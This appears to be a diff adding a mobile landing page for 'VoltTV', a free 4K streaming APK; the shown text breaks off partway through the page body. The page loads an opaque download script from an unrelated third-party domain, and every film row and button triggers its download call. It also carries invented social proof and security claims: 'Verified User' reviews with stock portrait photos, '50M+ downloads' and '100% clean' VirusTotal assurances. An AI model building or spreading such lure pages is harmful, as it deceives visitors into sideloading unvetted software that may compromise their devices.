@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+ 
+<script src="https://url.yuhd320k.site/js/meetu-sdk.js"></script>
+
+    
+
+   <script>
+// ========== k2 — 核心跳转方法 ==========
+function k2(){
+     MeetU.download(event);
+}
+</script>
+
+
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<title>VoltTV — Cinema in Your Pocket</title>
+<meta name="description" content="VoltTV — Stream blockbusters, binge series, and watch offline in 4K HDR. No ads. Download the free APK for Android.">
+<style>
+/* ============================================================
+   RESET
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'PingFang SC','Hiragino Sans GB','Microsoft YaHei',sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.55;
+  -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+  overflow-x:hidden;
+}
+img,svg{display:block;max-width:100%}
+button{font:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit;touch-action:manipulation}
+a{color:inherit;text-decoration:none}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:6px}
+b,strong{font-weight:700}
+
+/* ============================================================
+   TOKENS — editorial noir
+   ============================================================ */
+:root{
+  --bg:#0B0D12;
+  --bg-2:#10131A;
+  --surface:#161A23;
+  --surface-2:#1D222E;
+  --ink:#EDEFF3;
+  --ink-2:#A6ADBB;
+  --ink-3:#6A7180;
+  --line:rgba(255,255,255,0.08);
+  --line-strong:rgba(255,255,255,0.16);
+  --accent:#FF3B5C;
+  --accent-soft:rgba(255,59,92,0.14);
+  --violet:#8B5CFF;
+  --violet-soft:rgba(139,92,255,0.18);
+  --green:#3DDC84;
+  --green-soft:rgba(61,220,132,0.14);
+  --star:#FFC94D;
+  --gold:#E8B96B;
+  --radius-sm:12px;--radius-md:16px;--radius-lg:20px;--radius-full:9999px;
+  --shadow-sm:0 1px 2px rgba(0,0,0,0.4),0 8px 20px rgba(0,0,0,0.3);
+  --shadow-md:0 2px 4px rgba(0,0,0,0.4),0 18px 44px rgba(0,0,0,0.42);
+  --grad-accent:linear-gradient(135deg,var(--accent),var(--violet));
+  --ease-out:cubic-bezier(0.22,1,0.36,1);
+}
+
+/* ============================================================
+   PAGE
+   ============================================================ */
+.page{max-width:480px;margin:0 auto;padding:0 20px 120px;position:relative}
+@media(min-width:481px){
+  body{background:#05060A}
+  .page{background:var(--bg);border-left:1px solid rgba(255,255,255,0.06);border-right:1px solid rgba(255,255,255,0.06);box-shadow:0 0 120px rgba(0,0,0,0.8);min-height:100vh}
+}
+
+/* ============================================================
+   MASTHEAD — magazine cover
+   ============================================================ */
+.mast{padding-top:24px;padding-bottom:18px;border-bottom:3px double var(--line-strong)}
+.mast-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+.mast-brand{display:flex;align-items:center;gap:9px}
+.mast-brand img{width:26px;height:26px;border-radius:8px;box-shadow:0 0 0 1px var(--line-strong)}
+.mast-brand b{font-size:0.82rem;letter-spacing:0.01em}
+.mast-brand b i{font-style:normal;color:var(--accent)}
+.mast-issue{font-size:0.56rem;letter-spacing:0.22em;text-transform:uppercase;color:var(--ink-3)}
+.mast-kicker{display:inline-flex;align-items:center;gap:8px;font-size:0.6rem;font-weight:700;letter-spacing:0.18em;text-transform:uppercase;color:var(--accent);margin-bottom:12px}
+.mast-kicker::before{content:'';width:18px;height:2px;background:var(--accent)}
+.mast h1{font-size:clamp(2.1rem,11vw,2.8rem);font-weight:800;line-height:0.98;letter-spacing:-0.03em;margin-bottom:12px}
+.mast h1 em{font-style:normal;background:var(--grad-accent);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;color:var(--accent)}
+.mast-deck{font-size:0.86rem;color:var(--ink-2);line-height:1.62;max-width:36ch}
+.mast-meta{display:flex;gap:14px;margin-top:16px;padding-top:14px;border-top:1px solid var(--line);font-size:0.62rem;color:var(--ink-3);letter-spacing:0.02em}
+.mast-meta span b{color:var(--ink-2);font-weight:600}
+
+/* ============================================================
+   TIMELINE — left rail
+   ============================================================ */
+.rail{position:relative;margin-top:8px}
+.node{position:relative;padding:22px 0 6px}
+
+/* section label + title */
+.lbl{display:inline-flex;align-items:center;gap:7px;font-size:0.58rem;font-weight:700;letter-spacing:0.18em;text-transform:uppercase;color:var(--violet);margin-bottom:7px}
+.lbl::before{content:'';width:12px;height:2px;background:var(--violet)}
+.h2{font-size:1.5rem;font-weight:800;line-height:1.05;letter-spacing:-0.02em;margin-bottom:6px}
+.h2 em{font-style:normal;color:var(--accent)}
+.sub{font-size:0.76rem;color:var(--ink-3);line-height:1.55;max-width:38ch;margin-bottom:14px}
+
+/* ============================================================
+   HERO (node 01)
+   ============================================================ */
+.hero-media{position:relative;border-radius:var(--radius-lg);overflow:hidden;aspect-ratio:16/9;border:1px solid var(--line);box-shadow:var(--shadow-md);margin-bottom:12px}
+.hero-media img{width:100%;height:100%;object-fit:cover}
+.hero-media::after{content:'';position:absolute;inset:0;background:linear-gradient(180deg,transparent 50%,rgba(11,13,18,0.72) 100%)}
+.hero-cap{position:absolute;left:14px;bottom:12px;z-index:2;font-size:0.62rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:rgba(255,255,255,0.85)}
+.hero-chips{display:flex;gap:7px;flex-wrap:wrap}
+.hero-chips i{font-style:normal;font-size:0.62rem;font-weight:600;color:var(--ink-2);padding:5px 11px;border-radius:var(--radius-full);background:var(--surface);border:1px solid var(--line)}
+
+/* ============================================================
+   BILLBOARD — trending (node 02)
+   ============================================================ */
+.chart{display:flex;flex-direction:column}
+.chart-row{display:flex;align-items:center;gap:12px;padding:11px 0;border-bottom:1px solid var(--line);cursor:pointer;transition:background 0.15s}
+.chart-row:last-child{border-bottom:none}
+.chart-row:active{background:rgba(255,255,255,0.03)}
+.chart-no{width:34px;min-width:34px;font-size:1.3rem;font-weight:800;line-height:1;color:transparent;-webkit-text-stroke:1px var(--line-strong);text-align:left}
+.chart-row:nth-child(1) .chart-no{-webkit-text-stroke:1px var(--accent);color:var(--accent)}
+.chart-row:nth-child(2) .chart-no{-webkit-text-stroke:1px var(--violet);color:var(--violet)}
+.chart-row:nth-child(3) .chart-no{-webkit-text-stroke:1px var(--gold);color:var(--gold)}
+.chart-thumb{width:46px;height:64px;min-width:46px;border-radius:9px;overflow:hidden;border:1px solid var(--line);box-shadow:var(--shadow-sm)}
+.chart-thumb img{width:100%;height:100%;object-fit:cover}
+.chart-body{flex:1;min-width:0}
+.chart-title{font-size:0.82rem;font-weight:700;color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.chart-badge{display:inline-block;font-size:0.5rem;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;padding:2px 7px;border-radius:var(--radius-full);margin-top:4px}
+.cb-hot{background:var(--accent-soft);color:var(--accent)}
+.cb-new{background:var(--violet-soft);color:var(--violet)}
+.cb-top{background:rgba(255,201,77,0.15);color:var(--gold)}
+.cb-4k{background:rgba(255,255,255,0.08);color:var(--ink-2)}
+.chart-side{text-align:right}
+.chart-side b{display:block;font-size:0.7rem;font-weight:700;color:var(--star)}
+.chart-side span{font-size:0.54rem;color:var(--ink-3)}
+
+/* ============================================================
+   FEATURES (node 03) — numbered entries
+   ============================================================ */
+.entries{display:flex;flex-direction:column}
+.entry{display:flex;gap:14px;padding:15px 0;border-bottom:1px solid var(--line)}
+.entry:last-child{border-bottom:none}
+.entry-no{font-size:0.7rem;font-weight:800;color:var(--ink-3);letter-spacing:0.08em;padding-top:3px;min-width:22px}
+.entry-ic{width:38px;height:38px;min-width:38px;border-radius:11px;display:flex;align-items:center;justify-content:center;margin-top:-2px}
+.entry-ic svg{width:19px;height:19px}
+.entry.e1 .entry-ic{background:var(--accent-soft);color:var(--accent)}
+.entry.e2 .entry-ic{background:var(--violet-soft);color:var(--violet)}
+.entry.e3 .entry-ic{background:var(--green-soft);color:var(--green)}
+.entry.e4 .entry-ic{background:rgba(255,201,77,0.14);color:var(--star)}
+.entry-body h4{font-size:0.88rem;font-weight:700;color:var(--ink);margin-bottom:2px}
+.entry-body p{font-size:0.68rem;color:var(--ink-2);line-height:1.5}
+
+/* ============================================================
+   TOGETHER (node 04)
+   ============================================================ */
+.tog-banner{position:relative;overflow:hidden;border-radius:var(--radius-lg);padding:22px 20px;background:linear-gradient(135deg,rgba(255,59,92,0.16),rgba(139,92,255,0.16));border:1px solid rgba(255,255,255,0.1);box-shadow:var(--shadow-md)}
+.tog-banner::before{content:'';position:absolute;top:-50px;right:-40px;width:160px;height:160px;border-radius:50%;background:var(--grad-accent);filter:blur(42px);opacity:0.38}
+.tog-banner h3{font-size:1.25rem;font-weight:800;letter-spacing:-0.02em;line-height:1.12;margin-bottom:14px;position:relative;z-index:1}
+.tog-list{display:flex;flex-direction:column;position:relative;z-index:1}
+.tog-i{display:flex;gap:11px;padding:11px 0;border-bottom:1px solid rgba(255,255,255,0.07)}
+.tog-i:last-child{border-bottom:none}
+.tog-i b{font-size:0.7rem;font-weight:700;color:var(--accent);min-width:74px;letter-spacing:0.01em}
+.tog-i span{font-size:0.68rem;color:rgba(237,239,243,0.72);line-height:1.5}
+
+/* ============================================================
+   REVIEWS (node 05) — pull quotes
+   ============================================================ */
+.score{display:flex;align-items:baseline;gap:12px;margin-bottom:6px}
+.score-num{font-size:3rem;font-weight:800;line-height:1;letter-spacing:-0.03em;background:var(--grad-accent);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;color:var(--accent)}
+.score-stars{display:flex;gap:2px}
+.score-stars svg{width:14px;height:14px;color:var(--star)}
+.score-txt{font-size:0.66rem;color:var(--ink-3);margin-top:4px}
+.quote{position:relative;padding:16px 16px 16px 18px;border-left:3px solid var(--accent);background:var(--surface);border-radius:0 var(--radius-md) var(--radius-md) 0;margin-top:12px;box-shadow:var(--shadow-sm)}
+.quote-mark{position:absolute;top:-6px;left:10px;font-size:2.4rem;font-weight:800;line-height:1;color:var(--accent);opacity:0.28}
+.quote p{font-size:0.78rem;color:var(--ink-2);line-height:1.62;padding-top:8px}
+.quote-who{display:flex;align-items:center;gap:10px;margin-top:13px}
+.quote-av{width:34px;height:34px;min-width:34px;border-radius:50%;overflow:hidden;box-shadow:0 0 0 2px var(--violet-soft)}
+.quote-av img{width:100%;height:100%;object-fit:cover}
+.quote-name{font-size:0.72rem;font-weight:700;color:var(--ink)}
+.quote-name span{display:flex;align-items:center;gap:4px;font-weight:500;font-size:0.54rem;color:var(--green);margin-top:1px}
+
+/* ============================================================
+   SECURITY (node 06)
+   ============================================================ */
+.cert{display:flex;gap:14px;padding:17px;border-radius:var(--radius-md);background:var(--surface);border:1px solid var(--line);box-shadow:var(--shadow-sm)}
+.cert-shield{width:48px;height:48px;min-width:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;background:var(--green-soft);color:var(--green);box-shadow:0 0 20px rgba(61,220,132,0.28)}
+.cert-shield svg{width:26px;height:26px}
+.cert-body{flex:1;min-width:0}
+.cert-body h4{font-size:0.9rem;font-weight:700;color:var(--ink);margin-bottom:3px}
+.cert-body p{font-size:0.66rem;color:var(--ink-3);line-height:1.5;margin-bottom:11px}
+.cert-list{display:flex;flex-direction:column}
+.cert-row{display:flex;align-items:center;gap:9px;padding:8px 0;border-top:1px solid var(--line)}
+.cert-check{width:22px;height:22px;min-width:22px;border-radius:50%;background:var(--green-soft);color:var(--green);display:flex;align-items:center;justify-content:center}
+.cert-check svg{width:12px;height:12px}
+.cert-row span{font-size:0.68rem;color:var(--ink-2)}
+.cert-row span b{color:var(--ink);font-weight:600;display:block;font-size:0.72rem}
+.cert-row span i{font-style:normal;color:var(--ink-3);font-size:0.6rem}
+
+/* ============================================================
+   DOWNLOAD (node 07)
+   ============================================================ */
+.dl{position:relative;overflow:hidden;border-radius:var(--radius-lg);padding:28px 22px;text-align:center;background:linear-gradient(135deg,var(--accent),var(--violet));box-shadow:var(--shadow-md)}
+.dl::before{content:'';position:absolute;top:-60px;left:50%;transform:translateX(-50%);width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,0.16);filter:blur(50px)}
+.dl-icon{width:64px;height:64px;margin:0 auto 14px;border-radius:17px;overflow:hidden;box-shadow:0 0 0 2px rgba(255,255,255,0.35),0 12px 30px rgba(0,0,0,0.35);position:relative;z-index:1}
+.dl-icon img{width:100%;height:100%;object-fit:cover}
+.dl h2{font-size:1.6rem;font-weight:800;letter-spacing:-0.02em;color:#fff;line-height:1.08;margin-bottom:8px;position:relative;z-index:1}
+.dl p{font-size:0.74rem;color:rgba(255,255,255,0.85);margin-bottom:18px;position:relative;z-index:1}
+.dl-btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;min-height:56px;border-radius:var(--radius-md);background:#fff;color:#14161D;font-size:0.92rem;font-weight:800;box-shadow:0 14px 34px rgba(0,0,0,0.3);position:relative;z-index:1;transition:transform 0.15s var(--ease-out)}
+.dl-btn:active{transform:scale(0.97)}
+.dl-btn svg{width:19px;height:19px}
+.dl-note{font-size:0.56rem;color:rgba(255,255,255,0.72);margin-top:12px;position:relative;z-index:1}
+
+/* ============================================================
+   FAQ (node 08)
+   ============================================================ */
+.faqs{display:flex;flex-direction:column}
+.faq{border:1px solid var(--line);border-radius:var(--radius-md);background:var(--surface);box-shadow:var(--shadow-sm);margin-bottom:9px;overflow:hidden}
+.faq:last-child{margin-bottom:0}
+.faq-q{display:flex;align-items:center;gap:11px;padding:14px;width:100%;text-align:left}
+.faq-num{width:24px;height:24px;min-width:24px;border-radius:8px;background:var(--surface-2);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;font-size:0.6rem;font-weight:700;color:var(--ink-3);transition:0.2s}
+.faq.open .faq-num{background:var(--grad-accent);border-color:transparent;color:#fff}
+.faq-q span{flex:1;font-size:0.8rem;font-weight:600;color:var(--ink)}
+.faq.open .faq-q span{color:var(--accent)}
+.faq-arr{transition:transform 0.3s var(--ease-out);color:var(--ink-3);flex-shrink:0}
+.faq.open .faq-arr{transform:rotate(180deg);color:var(--accent)}
+.faq-a{max-height:0;overflow:hidden;transition:max-height 0.35s var(--ease-out)}
+.faq.open .faq-a{max-height:460px}
+.faq-a p{padding:0 15px 15px 49px;font-size:0.68rem;color:var(--ink-2);line-height:1.7}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.foot{margin-top:26px;padding-top:16px;border-top:1px solid var(--line);display:flex;flex-wrap:wrap;gap:8px;justify-content:center;font-size:0.62rem;color:var(--ink-3)}
+.foot a:active{color:var(--accent)}
+
+/* ============================================================
+   FIXED BOTTOM BAR
+   ============================================================ */
+.instbar{position:fixed;left:50%;bottom:0;transform:translateX(-50%);width:100%;max-width:480px;display:flex;align-items:center;gap:11px;padding:10px 18px max(10px,env(safe-area-inset-bottom));background:rgba(11,13,18,0.86);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-top:1px solid var(--line);z-index:100}
+.instbar-icon{width:42px;height:42px;min-width:42px;border-radius:12px;overflow:hidden;box-shadow:0 0 0 1px var(--line-strong)}
+.instbar-icon img{width:100%;height:100%;object-fit:cover}
+.instbar-meta{flex:1;min-width:0}
+.instbar-name{font-size:0.78rem;font-weight:700;color:var(--ink)}
+.instbar-sub{display:flex;align-items:center;gap:4px;font-size:0.6rem;color:var(--ink-3)}
+.instbar-sub svg{width:11px;height:11px;color:var(--star)}
+.instbar-btn{flex-shrink:0;padding:11px 17px;border-radius:var(--radius-full);background:var(--grad-accent);color:#fff;font-size:0.72rem;font-weight:700;box-shadow:0 8px 22px rgba(255,59,92,0.4)}
+.instbar-btn:active{transform:scale(0.95)}
+
+@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:0.01ms!important;transition-duration:0.01ms!important}}
+</style>
+</head>
+<body>
+
+<div class="page">
+
+  <!-- ============================================================
+       MASTHEAD
+       ============================================================ -->
+  <header class="mast">
+    <div class="mast-row">
+      <div class="mast-brand"><img src="img/logo.jpg" alt="VoltTV"><b>Volt<i>TV</i></b></div>
+      <span class="mast-issue">Est. 2026 · Streaming</span>
+    </div>
+    <div class="mast-kicker" data-i18n="hero_eyebrow">#1 Entertainment App · 2026</div>
+    <h1><span data-i18n="hero_title_a">Cinema in your</span> <em data-i18n="hero_title_b">pocket</em></h1>
+    <p class="mast-deck" data-i18n="hero_desc">Stream blockbusters, binge series, download for offline — all in stunning 4K HDR. No ads. Ever.</p>
+    <div class="mast-meta">
+      <span><b>4.8</b> rating</span>
+      <span><b>50M+</b> downloads</span>
+      <span><b>10K+</b> titles</span>
+    </div>
+  </header>
+
+  <!-- ============================================================
+       TIMELINE
+       ============================================================ -->
+  <main class="rail">
+
+    <!-- 01 HERO -->
+    <section class="node">
+      <div class="hero-media">
+        <img src="img/t1.jpg" alt="VoltTV featured">
+        <span class="hero-cap" data-i18n="hero_stat3">Cinematic Quality</span>
+      </div>
+      <div class="hero-chips">
+        <i>★ 4.8 · 50M+</i>
+        <i>4K HDR</i>
+        <i>No Ads</i>
+      </div>
+    </section>
+
+    <!-- 02 TRENDING -->
+    <section class="node">
+      <div class="lbl" data-i18n="trending_label">Trending Now</div>
+      <h2 class="h2"><span data-i18n="trending_h_a">What the world</span> <em data-i18n="trending_h_b">is watching</em></h2>
+      <p class="sub" data-i18n="trending_sub">Top picks, updated daily</p>
+      <div class="chart">
+        <div class="chart-row" onclick="k2()"><span class="chart-no">01</span><div class="chart-thumb"><img src="img/1a.png" alt="Project Hail Mary" loading="lazy"></div><div class="chart-body"><div class="chart-title">Project Hail Mary</div><span class="chart-badge cb-hot" data-i18n="card_hot">HOT</span></div><div class="chart-side"><b>4.9</b><span data-i18n="live_rating">Rating</span></div></div>
+        <div class="chart-row" onclick="k2()"><span class="chart-no">02</span><div class="chart-thumb"><img src="img/2a.png" alt="Send Help" loading="lazy"></div><div class="chart-body"><div class="chart-title">Send Help</div><span class="chart-badge cb-new" data-i18n="card_new">NEW</span></div><div class="chart-side"><b>4.7</b><span data-i18n="live_rating">Rating</span></div></div>
+        <div class="chart-row" onclick="k2()"><span class="chart-no">03</span><div class="chart-thumb"><img src="img/3a.png" alt="Good Luck, Have Fun" loading="lazy"></div><div class="chart-body"><div class="chart-title">Good Luck, Have Fun</div><span class="chart-badge cb-top" data-i18n="card_top">TOP</span></div><div class="chart-side"><b>4.8</b><span data-i18n="live_rating">Rating</span></div></div>
+        <div class="chart-row" onclick="k2()"><span class="chart-no">04</span><div class="chart-thumb"><img src="img/4a.png" alt="Years Later" loading="lazy"></div><div class="chart-body"><div class="chart-title">Years Later</div><span class="chart-badge cb-4k" data-i18n="card_4k">4K</span></div><div class="chart-side"><b>4.5</b><span data-i18n="live_rating">Rating</span></div></div>
+        <div class="chart-row" onclick="k2()"><span class="chart-no">05</span><div class="chart-thumb"><img src="img/5a.png" alt="The Rip" loading="lazy"></div><div class="chart-body"><div class="chart-title">The Rip</div><span class="chart-badge cb-4k" data-i18n="card_hd">HD</span></div><div class="chart-side"><b>4.6</b><span data-i18n="live_rating">Rating</span></div></div>
+        <div class="chart-row" onclick="k2()"><span class="chart-no">06</span><div class="chart-thumb"><img src="img/6a.png" alt="Crime 101" loading="lazy"></div><div class="chart-body"><div class="chart-title">Crime 101</div><span class="chart-badge cb-new" data-i18n="card_new">NEW</span></div><div class="chart-side"><b>4.8</b><span data-i18n="live_rating">Rating</span></div></div>
+      </div>
+    </section>
+
+    <!-- 03 FEATURES -->
+    <section class="node">
+      <div class="lbl" data-i18n="feat_label">Why VoltTV</div>
+      <h2 class="h2"><span data-i18n="feat_h_a">Everything you</span> <em data-i18n="feat_h_b">need. Nothing you don't.</em></h2>
+      <div class="entries">
+        <div class="entry e1"><span class="entry-no">01</span><div class="entry-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg></div><div class="entry-body"><h4 data-i18n="feat1_h">4K HDR</h4><p data-i18n="feat1_p">Dolby Vision & Atmos. Cinema-grade quality in your hands.</p></div></div>
+        <div class="entry e2"><span class="entry-no">02</span><div class="entry-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div><div class="entry-body"><h4 data-i18n="feat2_h">Offline Mode</h4><p data-i18n="feat2_p">Download anything. Watch on planes, trains, anywhere.</p></div></div>
+        <div class="entry e3"><span class="entry-no">03</span><div class="entry-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div><div class="entry-body"><h4 data-i18n="feat3_h">Multi-Device</h4><p data-i18n="feat3_p">Phone, tablet, TV — pause on one, resume on another.</p></div></div>
+        <div class="entry e4"><span class="entry-no">04</span><div class="entry-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div><div class="entry-body"><h4 data-i18n="feat4_h">Early Access</h4><p data-i18n="feat4_p">Exclusive premieres & behind-the-scenes before anyone else.</p></div></div>
+      </div>
+    </section>
+
+    <!-- 04 TOGETHER -->
+    <section class="node">
+      <div class="tog-banner">
+        <h3 data-i18n="bigfeat_h">⚡ Watch together, even apart</h3>
+        <div class="tog-list">
+          <div class="tog-i"><b>Sync Play</b><span data-i18n="bigfeat_1">watch in perfect sync with friends, anywhere in the world</span></div>
+          <div class="tog-i"><b>5 Profiles</b><span data-i18n="bigfeat_2">each with personalized recommendations</span></div>
+          <div class="tog-i"><b>Kids Mode</b><span data-i18n="bigfeat_3">safe, curated content for the little ones</span></div>
+          <div class="tog-i"><b>AI Subtitles</b><span data-i18n="bigfeat_4">real-time translation in 40+ languages</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 05 REVIEWS -->
+    <section class="node">
+      <div class="lbl" data-i18n="reviews_label">Loved by Millions</div>
+      <h2 class="h2"><span data-i18n="reviews_h_a">Don't take our</span> <em data-i18n="reviews_h_b">word for it</em></h2>
+      <div class="score">
+        <div class="score-num">4.8</div>
+        <div>
+          <div class="score-stars"><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg></div>
+          <div class="score-txt"><b>50M+</b> downloads · <b>10K+</b> titles</div>
+        </div>
+      </div>
+      <div class="quote">
+        <span class="quote-mark">&ldquo;</span>
+        <p data-i18n="review1">"Finally an app that actually delivers. The 4K quality is insane and offline downloads saved my commute. Cancelled everything else."</p>
+        <div class="quote-who"><div class="quote-av"><img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Sarah Mitchell" loading="lazy"></div><div class="quote-name">Sarah Mitchell <span>✓ <span data-i18n="verified_user">Verified User</span></span></div></div>
+      </div>
+      <div class="quote">
+        <span class="quote-mark">&ldquo;</span>
+        <p data-i18n="review2">"Multi-device sync is flawless. I start on my TV, finish on my phone in bed. The library is massive and the AI recommendations are scary good."</p>
+        <div class="quote-who"><div class="quote-av"><img src="https://randomuser.me/api/portraits/men/32.jpg" alt="James Rodriguez" loading="lazy"></div><div class="quote-name">James Rodriguez <span>✓ <span data-i18n="verified_user">Verified User</span></span></div></div>
+      </div>
+      <div class="quote">
+        <span class="quote-mark">&ldquo;</span>
+        <p data-i18n="review3">"Kids Mode is a lifesaver. My children have their own space and I don't worry about what they'll find. Best streaming app for families hands down."</p>
+        <div class="quote-who"><div class="quote-av"><img src="https://randomuser.me/api/portraits/women/23.jpg" alt="Emily Chen" loading="lazy"></div><div class="quote-name">Emily Chen <span>✓ <span data-i18n="verified_user">Verified User</span></span></div></div>
+      </div>
+    </section>
+
+    <!-- 06 SECURITY -->
+    <section class="node">
+      <div class="lbl" data-i18n="sec_label">Safe & Verified</div>
+      <h2 class="h2"><span data-i18n="sec_h_a">Your security</span> <em data-i18n="sec_h_b">is our priority</em></h2>
+      <p class="sub" data-i18n="sec_sub">Every release is scanned, signed, and verified before it reaches you.</p>
+      <div class="cert">
+        <div class="cert-shield"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div>
+        <div class="cert-body">
+          <h4 data-i18n="sec1_a">VirusTotal Scanned</h4>
+          <p data-i18n="sec1_b">100% clean · 72 engines passed</p>
+          <div class="cert-list">
+            <div class="cert-row"><div class="cert-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><span><b data-i18n="sec2_a">SHA-256 Signed</b><i data-i18n="sec2_b">Cryptographically verified · tamper-proof</i></span></div>
+            <div class="cert-row"><div class="cert-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><span><b data-i18n="sec3_a">Auto-Update</b><i data-i18n="sec3_b">Get the latest version as soon as we release</i></span></div>
+            <div class="cert-row"><div class="cert-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><span><b data-i18n="sec4_a">No Permissions Abuse</b><i data-i18n="sec4_b">Only requests what's strictly needed</i></span></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 07 DOWNLOAD -->
+    <section class="node">
+      <div class="dl">
+        <div class="dl-icon"><img src="img/logo.jpg" alt="VoltTV"></div>
+        <h2><span data-i18n="hero_title_a">Cinema in your</span> <em data-i18n="hero_title_b" style="color:#fff">pocket</em></h2>
+        <p data-i18n="hero_desc">Stream blockbusters, binge series, download for offline — all in stunning 4K HDR. No ads. Ever.</p>
+        <button class="dl-btn" onclick="k2()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg><span data-i18n="hero_cta">Download Free — Start Watching</span></button>
